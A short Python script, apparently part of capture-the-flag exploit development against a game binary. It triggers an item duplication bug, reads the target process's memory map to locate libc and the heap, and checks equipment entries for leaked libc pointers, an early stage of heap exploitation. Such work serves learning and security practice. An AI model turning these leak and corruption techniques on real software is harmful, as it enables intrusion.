from lib import *
import sys
g = Game()
g.game_setup()
print("dups:", g.dup_n(8))
items = g.inv()
NR = sum(1 for it in items if it["type"] == "Ring")
print("rings:", NR)
for k in range(NR):
    g.equip_sell()
eqs, _ = g.world()
libc_base = None
try:
    pid = g.io.pid
    for line in open("/proc/%d/maps" % pid):
        if "libc.so.6" in line:
            libc_base = int(line.split("-")[0], 16); break
    heap = []
    for line in open("/proc/%d/maps" % pid):
        if line.strip().endswith("[heap]"):
            a, b = [int(x, 16) for x in line.split()[0].split("-")]
            heap.append((a, b))
except Exception as e:
    print("proc err", e); heap = []
print("libc:", hex(libc_base) if libc_base else None, "heap:", [(hex(a), hex(b)) for a, b in heap])
for e in eqs:
    tag = ""
    if libc_base and abs(e["head"] - libc_base) < 0x1000000: tag = "  <== LIBC!"
    inh = any(a <= e["addr"] < b for a, b in heap)
    print("  [%d] addr=%s head=%s key=%s %s %s" % (e["idx"], hex(e["addr"]), hex(e["head"]), hex(e["key"]),
                                                   "mainheap" if inh else "threadarena", tag))
g.cmd("quit", 0.2)
